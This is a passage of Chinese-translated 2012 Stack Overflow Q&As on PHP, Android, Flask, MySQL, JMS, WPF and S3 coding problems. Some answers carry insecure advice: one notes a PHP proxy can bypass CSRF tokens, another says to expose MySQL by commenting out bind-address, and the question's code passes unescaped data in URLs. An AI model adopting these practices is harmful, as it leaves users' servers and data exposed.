RewriteEngine On
RewriteRule ^tag/([^+]+)\+(.*)$ /?pais=$1&area=$2 [L] 
```

# php - 如何将数据从一个站点保存到另一个站点数据库？

> ID：11847163
> 
> 赞同：0
> 
> 时间：2012-08-07T13:32:52.970
> 
> 标签：php, html

如何将数据从一个站点保存到另一个站点数据库？我需要制作一个将数据保存到外部数据库的表单。我尝试使用`fopen`，但我认为这不是正确的方法：

```
$externalsave = fopen('http://onewebsite.com/folder/this_page_INSERTS_INTO_DB.php?datavalue1='.$data1.'&datavalue2='.$data2, 'r');
$data = '';
while(!feof($externalsave)) 
   $data .= fread($externalsave, 4092); 
fclose($externalsave); 

echo $data; 
```

有人知道如何将插入到一个网站上的表单中的值保存在外部数据库中吗？

我正在使用 Apache 服务器，上面的代码工作正常，我只是不信任它。或者我可以吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:37:59.597

最简单的答案：

*   在站点 A 上设置表单。

*   将表单操作指向站点 B 上的脚本。

*   让站点 B 验证传入的变量并插入。

如果您实际上不想在 SITE A 上创建表单，也可以使用[cURL 。](http://php.net/manual/en/book.curl.php)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T13:45:06.003

有3个主要解决方案：

**1.远程操作**

最简单的方法是简单地将您的表单指向远程服务器。举个例子 ：

```
<form method="post" action="http://myothersite.com/myphpscript.php">
</form> 
```

并且`myphpscript.php`像在本地主机中一样简单地处理表单。

**2.代理操作**（需要启用allow_url_fopen指令）

您还可以将表单指向同一服务器上的 php 脚本，该脚本将在另一台服务器上发送您的数据。此解决方案可用于绕过诸如 csrf 令牌之类的安全性：

```
<form method="post" action="proxy.php"></form> 
```

代理.php：

```
$postdata = http_build_query($_POST); //Need some filtering !!!

$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => $postdata
    )
);

$context  = stream_context_create($opts);
$result = file_get_contents('http://myotherserver.com/submit.php', false, $context); 
```

这里不需要卷曲；）

**3.远程数据库**

最后，您可以使用具有远程访问权限的数据库，并使用其远程主机简单地连接到数据库，例如：

```
$mysqli = new mysqli('mydbHost.com', 'my_user', 'my_password', 'my_db'); 
```

不幸的是，这种解决方案很少被允许，因为它可能带来很大的安全风险（世界上任何人都可以尝试连接到数据库）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:53:22.723

你应该设置mysql（我想你的数据库是MySQL）来监听网络连接并直接连接到它。

在 /etc/mysql/my.cnf 中的 DB 服务器注释 'bind-address = 127.0.0.1' 上并重新启动 Mysql 守护程序。

在网络服务器上，执行：

```
$dbconnection = mysql_connect('IP_OF_DB_SERVER', 'username', 'userpassword'); 
```

只需将您的数据插入数据库。

# android - 在motorola fire xt上以编程方式打开手电筒

> ID：11847164
> 
> 赞同：1
> 
> 时间：2012-08-07T13:33:00.817
> 
> 标签：android, motorola, led, flashlight, xt

我已经尝试了几个代码，我在其他 stackoverflow 帖子中找到[了关闭摄像头 LED](https://stackoverflow.com/questions/6939816/turn-on-off-camera-led-flash-light-in-samsung-galaxy-ace-2-2-1-galaxy-tab)闪光灯、 [在 android](https://stackoverflow.com/questions/5503480/use-camera-flashlight-in-android)、code.google.com/p/droidled 和 code.google.com/p/torch 中使用摄像头手电筒，但我仍然不能打开我的摩托罗拉 fire XT 上的 LED 闪光灯。

我也尝试了几个安卓市场的手电筒应用程序，但没有人可以打开手电筒。

但是当我尝试使用默认的相机应用程序或android市场的[camera 360]时，当我按下拍摄相机按钮时手电筒会自动打开（必须先启用手电筒设置）

谁能指导我如何以编程方式打开手电筒？谢谢

# python - Flask/Tornado 中的 Gzip 响应

> ID：11847172
> 
> 赞同：5
> 
> 时间：2012-08-07T13:33:33.073
> 
> 标签：python, flask, gzip, tornado, wsgi

我有一个简单的 Flask 应用程序正在运行。为了发球，我使用 Tornado。启动服务器的代码如下所示：

```
# Run the app in server mode
http_server = HTTPServer(WSGIContainer(app))
http_server.listen(port)
IOLoop.instance().start() 
```

其中*app*是 Fl​​ask WSGI 应用程序对象 ( `app = Flask(__name__)`)。

现在服务器用整个 JSON 答案响应每个请求，**是否有（简单）返回 Gzipped 数据的方法？**在 Tornado 网站上，我找到了[http://www.tornadoweb.org/documentation/releases/v2.1.0.html?highlight=gzip](http://www.tornadoweb.org/documentation/releases/v2.1.0.html?highlight=gzip)，所以 Tornado 一定可以，但是 Flask 解决方案也很棒。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-08T19:49:20.693

正如 Nikolay 建议的那样，最简单的方法是使用 Nginx。它不会增加太多开销。

使用`tornado.web.Application`，您可以`compress_response=True`在初始化应用程序时通过。由于您使用的是 Flask，因此这是行不通的。您可以查看 Tornado 源代码，看看它在做什么，但这并不简单。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-09T09:54:39.003

设置一个 nginx 只是为了进行 gzip 压缩似乎很奇怪。

现在我使用这个[http://code.google.com/p/ibkon-wsgi-gzip-middleware/](http://code.google.com/p/ibkon-wsgi-gzip-middleware/)，很好。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-03-17T00:51:59.200

假设你想在你的 tornado.web.RequestHandler 派生类中回复一个发布请求，在“def post(self):”中

```
self.set_header("Content-type", 'text/plain') # or whatever you expect
self.set_header("Content-Encoding", 'gzip')
# don't forget to import zlib
gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
# response is the string where your response is
content = gzip_compress.compress(response) + gzip_compress.flush()
compressed_content_length = len(content)
self.set_header("Content-Length", compressed_content_length)
self.write(content) 
```

# mysql - 如何编写一个循环在mysql中进行计算

> ID：11847173
> 
> 赞同：0
> 
> 时间：2012-08-07T13:33:36.197
> 
> 标签：mysql

这是我的基本mysql查询，用于计算每日用户数，所以我需要从2012-01-30到2012-02-19执行，而不是手动修改，有什么好的方法吗？

```
select count(distinct user) FROM video WHERE date >= '2012-01-30 00:00' AND date <= '2012-01-30 23:55';

select count(distinct user) FROM video WHERE date >= '2012-01-31 00:00' AND date <= '2012-01-31 23:55';

... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:36:35.057

```
SELECT DATE(date) AS date, COUNT(DISTINCT user) FROM video
WHERE date >= '2012-01-30 00:00' AND date_pl <= '2012-02-19 00:00'
GROUP BY DATE(date) 
```

# java - Jms 异常：javax.naming.NoInitialContextException

> ID：11847175
> 
> 赞同：0
> 
> 时间：2012-08-07T13:33:45.483
> 
> 标签：java, jms, jndi

我是 Jms 的新手。我从 sun 网站下载了 jms 教程，当我使用本教程编写第一个 jms 应用程序时，我得到了一个异常。我的代码是这样的。异常是命名异常：

```
javax.naming.NoInitialContextException: Need to specify class name in environment or system property, or as an applet parameter, or in an application resource file:  java.naming.factory.initial Exception in thread "main" java.lang.NullPointerException. 
```

我的代码：

```
public class SampleClass1 {
  public static void main(String[] args) throws NamingException, JMSException {

     Context context=new InitialContext();

    QueueConnectionFactory queueConnectionFactory=(QueueConnectionFactory)context.lookup("QueueConnectionFactory");

    Queue queue=(Queue) context.lookup("MyQueue");

    QueueConnection queueConnection=(QueueConnection) queueConnectionFactory.createQueueConnection();

    QueueSession queueSession=queueConnection.createQueueSession(false,Session.AUTO_ACKNOWLEDGE);
    QueueSender queueSender=queueSession.createSender(queue);

    Message message=(Message) queueSession.createTextMessage("Hello Word");
    queueSender.send((javax.jms.Message) message);

    QueueReceiver queueReceiver=queueSession.createReceiver(queue);

    queueConnection.start();

    Message receivedMessage=(Message) queueReceiver.receive();
    System.out.println(receivedMessage.toString());

  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T13:52:33.893

只有在 web-container 等容器中运行时，才能使用以下内容。它被称为[**默认**上下文](http://www.cs.ait.ac.th/~on/O/oreilly/java-ent/ebeans/appd_04.htm)。

```
Context context=new InitialContext(); 
```

因为，你的是一个 java 桌面应用程序，你应该指定上下文工厂、提供程序 url 等。阅读[这篇文章](http://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface)。

# android - putExtra 不发送额外内容

> ID：11847176
> 
> 赞同：0
> 
> 时间：2012-08-07T13:33:46.243
> 
> 标签：android

我正在尝试为下一个活动发送一些额外内容，但它根本不起作用，我不明白为什么。我正在使用覆盖填充地图，单击时我尝试将覆盖项的 ID 发送到新活动，我得到 CursorIndexOutOfBounds。

```
 public static String ROW_ID = "row_id"; // Intent extra key

 protected boolean onTap(int index) {
    // TODO Auto-generated method stub
    // return super.onTap(index);

    ROW_ID = overlayItemList.get(index).getTitle();

    Intent intent = new Intent(context, ViewContactFromMap.class);
    intent.putExtra("ROW_ID", overlayItemList.get(index).getTitle());

    Log.e("putExtra", "ROW_ID is " + ROW_ID);

    context.startActivity(intent);
    return true;
} 
```

这里 Log.e 输出被点击的项目的 id。例 29。

但在我的下一个活动中，我尝试打开 Log.e，但它显示的值为 0，这就是我得到 CursorIndexOutOfBounds 的原因。但是为什么它没有获得 29 的值呢？

```
 // get the selected contact's row ID
    Bundle extras = getIntent().getExtras();
    rowID = extras.getLong(MyOverlays.ROW_ID);

    Log.e("ViewContactFromMap", "rowID is: " + rowID); 
```

即使我硬编码并将 ROW_ID 设置为 29，在下一个活动中我仍然会得到 0 的值

* * *

在我从下面这些人那里得到帮助之后，我得到了它：

```
 ROW_ID = overlayItemList.get(index).getTitle();

    Intent intent = new Intent(context, ViewContactFromMap.class);
    intent.putExtra("ROW_ID", overlayItemList.get(index).getTitle());

    Log.e("putExtra", "ROW_ID is " + ROW_ID);

    context.startActivity(intent); 
```

* * *

```
 // get the selected contact's row ID
    Bundle extras = getIntent().getExtras();
    rowIDs = extras.getString("ROW_ID");

    rowID = Long.parseLong(rowIDs); 
    Log.e("ViewContactFromMap", "rowID is: " + rowID); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:36:38.037

删除 ROW_ID 周围的引号`intent.putExtra(ROW_ID, overlayItemList.get(index).getTitle());`

或者

更改 ROW_ID 的大小写`public static String ROW_ID = "ROW_ID";`

**编辑：** 还要确保您的类型相同。 `getTitle`可能实际上是一个`String`. 在这种情况下，`getString(MyOverlays.ROW_ID)`可能就是您正在寻找的东西。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T13:36:40.347

在你的`.putExtra()`，你把字符串“ROW_ID”。因此，您需要在下一个活动中从字符串“ROW_ID”中获取数据`getExtras()`。

请注意，您的变量`ROW_ID`值是“row_id”，但您将值放入“ROW_ID”。尝试使用全部大写或全部小写 - 这些内容区分大小写。

说明：您将使用变量存储`.putExtra()`到标签“ROW_ID”中。然后，在另一个活动中，您试图`.getLong()`从变量中获取值`ROW_ID`，其值为“row_id”。你现在看到问题了吗？存储为“ROW_ID”的值，试图将其接收为“row_id”......这些标签不一样。结果，`.getLong()`找不到该值，因此将其设为 0。

简短的回答：将您的变量更改为`public static String ROW_ID = "ROW_ID";`并确保您真正想要获得的变量是长的。如果您要存储整数，请`.getInt()`改用，或`.getString()`用于字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:40:32.013

```
 public static String ROW_ID = "row_id"; // Intent extra key
private Context c;  

 protected boolean onTap(int index) {
Intent intent = new Intent(c, ViewContactFromMap.class);
                    intent.putExtra(ROW_ID, overlayItemList.get(index).getTitle());
                    c.startActivity(intent); 
}

// get the selected contact's row ID
    Bundle extras = getIntent().getExtras();
    rowID = extras.getLong(MyOverlays.ROW_ID);

    Log.e("ViewContactFromMap", "rowID is: " + rowID); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T13:41:33.357

overlayItemList.get(index).getTitle()); 可能正在返回一个字符串并且您正在使用

```
rowID = extras.getLong(MyOverlays.ROW_ID); 
```

我不确定，但请尝试以下操作

```
rowID = extras.getStringExtra(MyOverlays.ROW_ID); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-01-19T15:50:00.620

`Intent in = new Intent(this, XXX.class);`
`in.putExtra("testExtra", "TestData");`
`startActivity(in);`

同样的问题也发生在我身上。我解决了这个问题，添加了以下内容：

`Intent in = new Intent(this, XXX.class);`
`in.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);`
`in.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);`
`in.putExtra("testExtra", "TestData");`
`startActivity(in);`

# php - php 变量不会填充 onchange

> ID：11847177
> 
> 赞同：0
> 
> 时间：2012-08-07T13:33:47.870
> 
> 标签：php, html, onchange

我正在尝试获取下拉选择框的值，这是我尝试使用的代码，因为它类似于我将数据添加到数据库的方式，`$_POST`我不确定为什么它没有加载到变量中已尝试回显 var_dump，它只返回 null。

```
<select name="raceTrack" onchange="<?$track = $_POST['raceTrack']?>"> 
```

我不确定为什么会发生这种情况以及如何解决它我已经搜索了谷歌并且似乎找不到任何东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:35:59.443

您正在混合 PHP 和 JavaScript。PHP 在服务器上执行，并不关心用户最后做了什么。Javascript 在用户机器上执行，并不关心服务器在做什么。

您需要将两者结合起来，例如发送`OnChange`回服务器以能够使用 PHP 代码中的变量 - 或者只是让 JavaScript 执行您需要执行的操作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T13:35:59.800

onChange 是 JavaScript 功能，除非您进行 AJAX 调用，否则无法与 PHP 对话

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T13:36:45.167

浏览器无法在 onChange 中执行 PHP 命令。您只能在那里使用 javascript。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T13:38:21.560

服务器端的 PHP 进程。您正在尝试使用 JavaScript（客户端）调用来执行它。在调用阶段，PHP 已经被执行。

您应该做的是发送一个 AJAX 请求，其中包含查询字符串或 POST 正文中的变量值。

URL 另一端的 PHP 脚本可以从查询字符串或 POST 正文中读取值，然后您就可以使用该变量执行任何操作。

# c# - 使用 IValueConverter 过滤 ObservableCollection

> ID：11847178
> 
> 赞同：1
> 
> 时间：2012-08-07T13:33:50.727
> 
> 标签：c#, xaml, data-binding, windows-runtime

我正在构建一个 Windows 8 Metro 应用程序，我需要在其中过滤一个`ObservableCollection`. 遗憾的是，WinRT-Framework 中的 CollectionViewSource-Class 不支持过滤，所以我尝试使用`IValueConverter`for 这样做。

我的 XAML：

```
<RadioButton Content="this Week" GroupName="AppointmentFilter" IsChecked="True" Name="rbtnFilter"/>
<RadioButton Content="all" GroupName="AppointmentFilter"/>
<ListView ItemsSource="{Binding Appointments, ConverterParameter={Binding rbtnFilter.IsChecked}, Converter={StaticResource Filter}}"/> 
```

我的 IValueConverter：

```
public class AppointmentListFilter : IValueConverter
{
    public object Convert(object value, Type targetType, object parameter, string language)
    {
        ObservableCollection<VMAppointment> appointments = value as ObservableCollection<VMAppointment>;
        bool filter = (bool)parameter;

        if (filter)
        {
            return new ObservableCollection<VMAppointment>(appointments.Where(x => x.Date.CompareTo(DateTime.Now.AddDays(7)) <= 0));
        }
        else
        {
            return appointments;
        }
    }

    public object ConvertBack(object value, Type targetType, object parameter, string language)
    {
        throw new NotImplementedException();
    }
} 
```

执行时`IValueConverter`，参数“parameter”为空，而不是布尔值。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T16:29:13.147

如果绑定本身不支持绑定，您可以更改 Appointments 属性的类型，使其包含您想要的参数。如果您的转换器只被调用一次 - 您可以尝试订阅 ObservableProperty 的[CollectionChanged](http://msdn.microsoft.com/en-us/library/windows/apps/ms653375%28v=vs.110%29.aspx)事件并在每次发生时为 Appointments 引发 PropertyChanged 事件。

# php - 如何使用 Amazon S3 SDK 更新元数据

> ID：11847179
> 
> 赞同：8
> 
> 时间：2012-08-07T13:33:51.750
> 
> 标签：php, amazon-s3, amazon-web-services, http-headers

我正在使用亚马逊 AWS 开发工具包的 PHP 版本。我有一堆带有`Expires`标题的文件；我想删除该标题并添加一个`Cache-control`标题。update_object[函数](http://docs.amazonwebservices.com/AWSSDKforPHP/latest/index.html#m=AmazonS3/update_object)允许我添加标题但不能删除它们。

这个[问题的答案](https://stackoverflow.com/questions/269840/is-it-possible-to-change-headers-on-an-s3-object-without-downloading-the-entire)表明您可以在复制文件时更新文件的元数据，但我已经尝试过了，但它不起作用。这是我使用的：

```
$response = $s3->copy_object(
    array(
        'bucket' => $bucket,
        'filename' => $file,
    ),
    array(
        'bucket' => $bucket,
        'filename' => $file2,
    ),
    array(
        'acl' => AmazonS3::ACL_PUBLIC,
        'headers' => array(
            'Content-Type' => 'image/jpeg',
            'Cache-Control' => 'public,max-age=30240000',
        ),
        'meta' => array(
            'x-fake-header' => 'something awesome is happening',
        ),
    )
); 
```

但是，复制的对象具有与原始对象完全相同的标头（仅限 Expires 和 Content-Type）。我已经尝试了上述所有方式的组合（有和没有 Content-Type、Cache-control、meta 等）并得到相同的结果。

如何重置元数据？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-07T13:48:21.667

我刚刚发现将对象复制到自身实际上*确实*会正确更改标题。我将它复制到第二个文件以进行测试以避免覆盖原始文件。

但是由于某些奇怪的原因，复制到不同的文件不会更改标题，但复制到同一个文件会。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2019-01-09T11:13:54.760

根据 Jeffin P S 的回答（效果很好），我提出了一个通过克隆原始元数据对象来创建新元数据对象的版本。这样，特定于 AWS 的（非用户）元数据不会转换为用户元数据。不确定这是否是一个真正的问题，但这样似乎更合法。

```
ObjectMetadata metadataCopy = amazonS3Client.getObjectMetadata(bucketName, fileKey).clone();
metadataCopy.addUserMetadata("yourKey", "updateValue");
metadataCopy.addUserMetadata("otherKey", "newValue");

CopyObjectRequest request = new CopyObjectRequest(bucketName, fileKey, bucketName, fileKey)
      .withSourceBucketName(bucketName)
      .withSourceKey(fileKey)
      .withNewObjectMetadata(metadataCopy);

amazonS3Client.copyObject(request); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-04-23T05:30:37.457

在 Java 中，您可以将对象复制到同一位置。这里元数据不会在复制对象时复制。您必须获取原始元数据并设置为复制请求。更推荐使用此方法插入或更新 Amazon S3 对象的元数据

```
ObjectMetadata metadata = amazonS3Client.getObjectMetadata(bucketName, fileKey);
ObjectMetadata metadataCopy = new ObjectMetadata();
metadataCopy.addUserMetadata("yourKey", "updateValue");
metadataCopy.addUserMetadata("otherKey", "newValue");
metadataCopy.addUserMetadata("existingKey", metadata.getUserMetaDataOf("existingValue"));

CopyObjectRequest request = new CopyObjectRequest(bucketName, fileKey, bucketName, fileKey)
      .withSourceBucketName(bucketName)
      .withSourceKey(fileKey)
      .withNewObjectMetadata(metadataCopy);

amazonS3Client.copyObject(request); 
```

# javascript - 图像计时器中的问题

> ID：11847183
> 
> 赞同：1
> 
> 时间：2012-08-07T13:34:00.023
> 
> 标签：javascript, jquery

我正在尝试为我的图像滑块构建一个计时器，因为它在此站点 [https://store.sap.com/sap/cpa/repository/store/sapstore/US/default.html](https://store.sap.com/sap/cpa/repository/store/sapstore/US/default.html)

这是我自己尝试过的。带有文字的图像滑动良好，但我的计时器有问题。但是由于我在尝试过的链接中评论了该代码，因此存在一些问题：

[http://codebins.com/bin/4ldqp9c/24](http://codebins.com/bin/4ldqp9c/24)

在这里，我创建了一个缩略图，但问题是将图像及其文本与此计时器绑定。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:30:23.530

我根据图像长度生成了 li ：

```
for(var i = 0; i< maximages; i++){   
    var th = '<li><a href="#'+i+'"></a></li>';
    $(th).appendTo('#thumbs > ul');
} 
```

并在 li 上添加一个点击功能（并不完美，但这是一个想法）：

```
$('.paging >li a').on('click', function(e){
    e.preventDefault();
    //console.log(e.target.href);
    var slide = e.target.href.split('#')[1];
    console.log(slide);
    prevIndex = slide; //set next slide to index clicked
}); 
```

为拇指设置动画：

```
$('.paging > li').eq(prevIndex-1).css('background-color', '#777777');
$('.paging > li').eq(prevIndex).css('background-color', '#FF0'); 
```

更多的效果应该用 Jquery UI 来完成。

[例子](http://jsfiddle.net/UgQJG/)

对不起，但现在我没有太多时间来测试它，但希望这会有所帮助。

# wpf - INotifyPropertyChanged 事件在 VB.NET 中的 WPF 中的可观察集合发生更改时未触发

> ID：11847189
> 
> 赞同：1
> 
> 时间：2012-08-07T13:34:44.887
> 
> 标签：wpf, vb.net, observablecollection, inotifypropertychanged

我正在尝试在具有 MVVM 模式的 WPF 中使用数据绑定。到目前为止，似乎一切都已正确完成，并且我使用了正确类型的类和对象。我的可观察集合首次正确加载，但在数据网格更改时不会刷新。Observable Collections 应该自动实现 INPC，并且我还在我的基类中为它提供了一个处理程序，所以我很困惑为什么它仍然无法工作并更新我的 UI。下面是我的代码：

视图模型基类：

```
#Region "INotifyPropertyChanged Members"
Public Event PropertyChanged As PropertyChangedEventHandler Implements INotifyPropertyChanged.PropertyChanged
Protected Overridable Sub OnPropertyChanged(ByVal propertyName As String)
    VerifyPropertyName(propertyName)
    Dim handler As PropertyChangedEventHandler = PropertyChangedEvent
    If handler IsNot Nothing Then
        Dim e = New PropertyChangedEventArgs(propertyName)
        handler(Me, e)
    End If
End Sub
#End Region 
```

MainWindowViewModel 类：

```
Public Class MainWindowViewModel
    Inherits ViewModelBase

    Private Shared _coreInfoData As ObservableCollection(Of Person)
    Public Shared Property CoreInfoData() As ObservableCollection(Of Person)
        Get
            Return _coreInfoData
        End Get
        Set(ByVal value As ObservableCollection(Of Person))
            _coreInfoData = value
        End Set

    Public Sub Main()
        If CoreInfoData IsNot Nothing Then
            CoreInfoData.Clear()
        End If
        CoreInfoData = GetRecords()
    End Sub 
```

GetRecords 函数是对获取最新可用记录集的数据库的调用。

在我看来，我实际上是绑定到 CollectionViewSource 并将其绑定到数据网格：

```
<UserControl.Resources>
    <CollectionViewSource Source="{Binding Path=CoreInfoData, Mode=TwoWay}" x:Key="cvs">
        <CollectionViewSource.GroupDescriptions>
            <dat:PropertyGroupDescription PropertyName="GroupId"/>
        </CollectionViewSource.GroupDescriptions>
    </CollectionViewSource>
</UserControl.Resources>
<DataGrid ItemsSource="{Binding Source={StaticResource cvs}}" AutoGenerateColumns="False" >
    <DataGrid.Columns>
        <DataGridTextColumn Header="Last Name" Binding="{Binding Path=LastName}" IsReadOnly="True" />
        <DataGridTextColumn Header="First Name" Binding="{Binding Path=FirstName}" IsReadOnly="True"/>
    </DataGrid.Columns>
</DataGrid> 
```

该类`Person`具有属性`LastName`和`FirstName`（以及其他）。据我了解，如果 ObservableCollection 本身发生变化 - 就像我通过清除和填充它所做的那样，它应该自动触发 INPC 事件，但我的 DataGrid 似乎没有第二次刷新。任何想法都会非常有帮助。

谢谢！

****编辑**** 以下是我解决问题的方法：

公共共享属性 CoreInfoData() As ObservableCollection(Of Person)

```
Public Shared Property CoreInfoData() As ObservableCollection(Of Person)
    Get
        Return _coreInfoData
    End Get
    Set(ByVal value As ObservableCollection(Of Person))
        If _coreInfoData Is Nothing Then
            'get data
             _coreInfoData = value
        Else
             'refresh data
             _coreInfoData.Clear()
              For i = 0 To value.Count - 1
                    _coreInfoData.Add(value(i))
              Next
        End If
    End Set
End Property 
```

第一次调用 Set 方法时，它将创建一个新的 _coreInfoData 变量。随后的调用将通过清除它的全部内容并循环遍历每个项目以将其重新添加到集合中来替换现有的调用。感谢 Clemens、Dan Busha 和 Charleh（和其他人）的有益评论！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:40:13.307

不会仅仅因为属性的类型是 就自动引发 PropertyChanged 事件`ObservableCollection`。您必须在 setter 中提出它：

```
Set(ByVal value As ObservableCollection(Of Person)) 
    _coreInfoData = value
    OnPropertyChanged("CoreInfoData")
End Set 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T13:45:51.587

看起来您正在为 ObservableCollection 分配一个值，该值不会更改您的集合，而是替换它。为 CoreInfoData 属性引发 PropertyChanged 事件，或者将`set`值中的项目一一添加到 ObservableCollection（ObservableCollection 应该为您管理 PropertyChanged 事件的引发）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-07T14:11:34.587

您将[INotifyPropertyChanged](http://msdn.microsoft.com/en-us/library/system.componentmodel.inotifypropertychanged.aspx)与[INotifyCollectionChanged](http://msdn.microsoft.com/en-us/library/system.collections.specialized.inotifycollectionchanged.aspx)混淆了。

ObservableCollection 确实实现了 INotifyPropertyChanged，这用于触发 Count 和索引器 Item[] 等属性的事件。它不会扩展到您需要它实现的功能。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T13:48:09.233

首先 - 为什么您的收藏是共享/静态的？

使用 ObservableColelction 时，通常只创建一次实例并使用 clear, add remove。

如果你想像在 setter 中那样设置一个新实例，你也必须调用 OnPropertyChanged("CoreInfoData") 。

但我更喜欢明确并添加

```
 CoreInfoData.Clear()
    CoreInfoData.AddRange(GetRecords()) 
```

# twitter - 集群数据库设置失败

> ID：11847192
> 
> 赞同：2
> 
> 时间：2012-08-07T13:35:08.177
> 
> 标签：twitter, graph-databases, querulous, flockdb

我成功构建了 twitter 的图形数据库flockdb。但是当我在 dist/flockdb/scripts 下运行脚本“setup-env.sh”时，我得到了以下错误（来自 development.log）：

```
INF [20120807-19:01:36.635] stats: Starting LatchedStatsListener
INF [20120807-19:01:36.684] admin: Admin HTTP interface started on port 9990.
WAR [20120807-19:01:37.277] querulous: Error initially populating pool localhost
WAR [20120807-19:01:37.277] querulous: com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failure

The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.
WAR [20120807-19:01:37.277] querulous:     at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
WAR [20120807-19:01:37.277] querulous:     at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
WAR [20120807-19:01:37.277] querulous:     at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
WAR [20120807-19:01:37.277] querulous:     at java.lang.reflect.Constructor.newInstance(Constructor.java:513)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.Util.handleNewInstance(Util.java:411)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:1116)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:344)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.ConnectionImpl.coreConnect(ConnectionImpl.java:2332)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:2369)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:2153)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.ConnectionImpl.<init>(ConnectionImpl.java:792)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.JDBC4Connection.<init>(JDBC4Connection.java:47)
WAR [20120807-19:01:37.277] querulous:     at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
WAR [20120807-19:01:37.277] querulous:     at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
WAR [20120807-19:01:37.277] querulous:     at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
WAR [20120807-19:01:37.277] querulous:     at java.lang.reflect.Constructor.newInstance(Constructor.java:513)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.Util.handleNewInstance(Util.java:411)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:381)
WAR [20120807-19:01:37.277] querulous:     at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:305)
WAR [20120807-19:01:37.277] querulous:     at java.sql.DriverManager.getConnection(DriverManager.java:582)
WAR [20120807-19:01:37.277] querulous:     at java.sql.DriverManager.getConnection(DriverManager.java:185)
WAR [20120807-19:01:37.277] querulous:     at com.twitter.querulous.database.ThrottledPoolingDatabase.mkConnection(ThrottledPoolingDatabase.scala:266)
WAR [20120807-19:01:37.277] querulous:     at com.twitter.querulous.database.ThrottledPoolingDatabase$$anonfun$5.apply(ThrottledPoolingDatabase.scala:229)
WAR [20120807-19:01:37.277] querulous:     at com.twitter.querulous.database.ThrottledPoolingDatabase$$anonfun$5.apply(ThrottledPoolingDatabase.scala:229)
WAR [20120807-19:01:37.277] querulous:     at com.twitter.querulous.database.ThrottledPool.addObject(ThrottledPoolingDatabase.scala:67)
WAR [20120807-19:01:37.277] querulous:     at com.twitter.querulous.database.ThrottledPool$$anonfun$1.apply$mcVI$sp(ThrottledPoolingDatabase.scala:58)
WAR [20120807-19:01:37.277] querulous:     at scala.collection.immutable.Range$ByOne$class.foreach$mVc$sp(Range.scala:285)
WAR [20120807-19:01:37.277] querulous:     at scala.collection.immutable.Range$$anon$2.foreach$mVc$sp(Range.scala:265)
WAR [20120807-19:01:37.277] querulous:     at com.twitter.querulous.database.ThrottledPool.<init>(ThrottledPoolingDatabase.scala:58)
WAR [20120807-19:01:37.277] querulous:     at com.twitter.querulous.database.ThrottledPoolingDatabase.<init>(ThrottledPoolingDatabase.scala:229)
WAR [20120807-19:01:37.277] querulous:     (...more...) 
```

这似乎是由 querulous 引起的一些问题。谁能给我一些关于如何解决这个问题的建议？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T06:27:07.310

